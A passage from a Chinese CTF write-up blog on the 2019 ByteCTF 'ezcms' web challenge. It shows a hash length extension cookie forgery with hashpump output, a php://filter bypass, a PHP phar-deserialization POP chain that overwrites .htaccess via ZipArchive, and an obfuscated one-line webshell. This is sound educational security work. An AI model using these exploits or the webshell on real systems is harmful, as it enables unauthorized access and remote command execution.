+<p><img src="https://i.loli.net/2019/09/14/ZeRuhaHM8xNiFws.png" alt="58C0EE14-8370-49B4-85A6-EF1B67EDB1ED.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytectf&#123;61878fa75f293f179a895bf74e358a4f&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-ezcms"><a href="#0x03-ezcms" class="headerlink" title="0x03 ezcms"></a>0x03 ezcms</h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://112.126.102.158:9999" target="_blank" rel="noopener">http://112.126.102.158:9999</a></p>
+<h4 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h4><p>首先是一个源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">112.126.102.158:9999/www.zip</span><br></pre></td></tr></table></figure></p>
+<p>看到<code>config.php</code>中的<code>is_admin</code>函数时，就基本可以判断，此处可以使用hash扩展攻击bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">"admin"</span> &amp;&amp; $password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.$username.$password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>哈希长度扩展攻击的一般利用步骤如下：</p>
+<ul>
+<li>知道<code>md5($secret.$username.$password)</code>的值</li>
+<li>知道<code>$SECRET</code>的长度</li>
+<li>我们可以算出另外一个 md5 值和另外一个user的值，使得<code>$COOKIE[&#39;user&#39;] == md5($secret.$username.$password)</code></li>
+</ul>
+<p>所以首先输入任意密码登录后在cookie中获取到对应的hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.cookie</span><br><span class="line">&quot;PHPSESSID=bodvgts7e1v6duqtcvq0miplul; hash=b1a9c01292d57c0d2010add7f8d10c41&quot;</span><br></pre></td></tr></table></figure></p>
+<p>之后，因为要伪造的password的值为admin，所以对应的长度是 len($SECRET)+len($password)=13</p>
+<p>最后使用<code>hashpump</code>伪造得到对应的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: b1a9c01292d57c0d2010add7f8d10c41</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: zeroyu</span><br><span class="line">f27536145794288b2c1f94f0a62695a9</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00zeroyu</span><br></pre></td></tr></table></figure></p>
+<p>之后将<code>\x</code>换为<code>%</code>即可得到对应的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00zeroyu</span><br></pre></td></tr></table></figure></p>
+<p>之后就可以用admin的身份来上传文件了</p>
+<p>从代码中可以看到，webapp是自己生成了一个<code>.htaccess</code>文件来阻止对我们shell的解析，所以我们的目标就是覆盖或者删除这个文件。</p>
+<p>有文件上传点，源码中有类，还有一个疑似可以触发phar反序列化的点，基本就可以判断这是一个反序列化漏洞。</p>
+<p>大概看了一下官方手册，发现 <code>mime_content_type</code> 函数的实现，其实也是通过读取对应的文件来实现的，既然读文件就有可能会触发phar发序列化漏洞，之后本地测试发现的确可以触发。</p>
+<p>前面的协议限制我们可以使用php伪协议来进行绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath)</span><br></pre></td></tr></table></figure></p>
+<p>对应的绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://filename.phar</span><br></pre></td></tr></table></figure></p>
+<p>之后就是找一条pop链来完成对<code>.htaccess</code>的修改，最开始想使用<code>move_uploaded_file</code>函数将文件移走，但是后面发现<code>move_uploaded_file</code>的第一个参数必须是post传递的，因此失败。</p>
+<p>后面就关注到Profile类<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>虽然webapp自身没有提供对应的函数，但是php系统中是否存在某个类可以完成文件修改的效果，所以顺着这个思路就找到了<code>ZipArchive::open</code> <a href="https://www.php.net/manual/zh/ziparchive.open.php" target="_blank" rel="noopener">对应的手册说明</a></p>
+<p>所以最终构造出的exp如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$o-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$o-&gt;checker-&gt;admin=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">$o-&gt;checker-&gt;username=<span class="string">"./sandbox/f528764d624db129b32c21fbca0cb8d6/.htaccess"</span>;</span><br><span class="line">$o-&gt;checker-&gt;password=ZIPARCHIVE::OVERWRITE;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>之后我们本地动态调试一下这个链，可以看到是已经触发了的，并且触发之后<code>.htaccess</code>文件也被修改了</p>
+<p><img src="https://i.loli.net/2019/09/14/QmRkhdI68wvWUGn.png" alt="3E7D9164-1ACB-4322-ABC8-544705C9BF73.png"></p>
+<p>之后我们之后需要上传一个bypass限制的webshell，然后再触发反序列化删掉<code>.htaccess</code>文件即可getshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$z=<span class="string">"sys"</span>.<span class="string">"tem"</span>;</span><br><span class="line">$z($_GET[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/14/7RdApN51tFYBfQ3.png" alt="7D460532-3282-48EA-B2DE-24FA7B419C1E.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-boring-code"><span class="toc-number">2.</span> <span class="toc-text">0x01 boring_code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答"><span class="toc-number">2.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-RSS"><span class="toc-number">3.</span> <span class="toc-text">0x02 RSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ezcms"><span class="toc-number">4.</span> <span class="toc-text">0x03 ezcms</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&text=2019 bytectf writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&is_video=false&description=2019 bytectf writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2019 bytectf writeup&body=Check out this article: http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&name=2019 bytectf writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-129276044-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'z3r0yu';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
